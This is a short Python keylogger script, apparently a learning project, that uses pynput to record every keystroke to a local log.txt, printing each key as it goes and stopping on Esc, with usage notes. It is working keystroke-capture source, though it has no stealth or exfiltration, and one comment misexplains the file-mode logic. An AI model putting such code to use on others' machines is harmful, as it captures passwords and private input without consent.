# Simple_Keylogger.py
# Created a Simple Keylogger script in Python
# Author: Anthony Constant (AC)

################################# SOME NOTES #########################################

## This is a simple keylogger script created in Python by Anthony Constant (AC). The script uses the pynput plugin to control and monitor devices, and it logs every key pressed by the user to a specified file.


######################## HOW DOES IT WORK ##############################################
## The script works by detecting every key pressed by the user and logging it to a file. 
## The log file is specified in the script, and it is created automatically if it does not exist. 
## The script logs the key presses every count times, where count is a variable that can be changed to log the key presses more or less frequently.

######################## USAGE ##############################################
## To use this script, follow these steps:

## Install the pynput plugin by running pip install pynput in the command prompt or terminal.

## Run the Simple_Keylogger.py script.

## The script will start running and logging every key press to a file called log.txt.

## To stop the script, press the esc key.

############################# REFERENCES ###############################################

## https://www.kaspersky.co.uk/resource-center/definitions/keylogger


########################################################################################
############################ START PROJECT HERE #######################################
############################################################################################




import pynput # import pynput plugin to control and monitor devices. run>cmd>pip install pynput. 

from pynput.keyboard import Key, Listener # from pyput.keyboard library we need a Key and Listener.

count = 0 # every so many keys save it to log file.
keys = []



def on_press(key): # create on press function passing the key as the parameter.
    global keys, count # create global variables keys and count. 

    keys.append(key)
    count += 1
 


    print(" {0} pressed".format(key)) # print key being pressed and used .format to format it.

    if count >= 1: # save after x amount of times a button is pressed.
        count = 0
        write_file(keys)
        keys = []

def write_file(keys): # create a function to write key being pressed to a specified file. # "af f" sets it into append mode. 
    with open("log.txt", "a" or "w") as f: # specified "log.txt" file here. "a" file which has already been created write to. OR use "w" if file has not been created, then create it.  Added the 'or' function to create the text file and begin storing the keylogs. Now the specified file does not need to be created manually. 
        for key in keys: # loop through all the keys and write them into a file.
            k = str(key).replace("'", "") # replace and remove ' marks in log.txt file.
            if k.find("space") > 0:
                f.write('\n') # create new line
            elif k.find("Key") == -1:
                 f.write(k)
               
                   
            
 
def on_release(key): # create on release function passing the key as the parameter.
        if key == Key.esc: # break out the loop if we hit the esc key.
            return False

with Listener(on_press=on_press, on_release=on_release) as listener: # on_press detects when a key is being pressed and on_release detects when a key is being released.
    listener.join() # constantly keeps running this loop until break out of it.
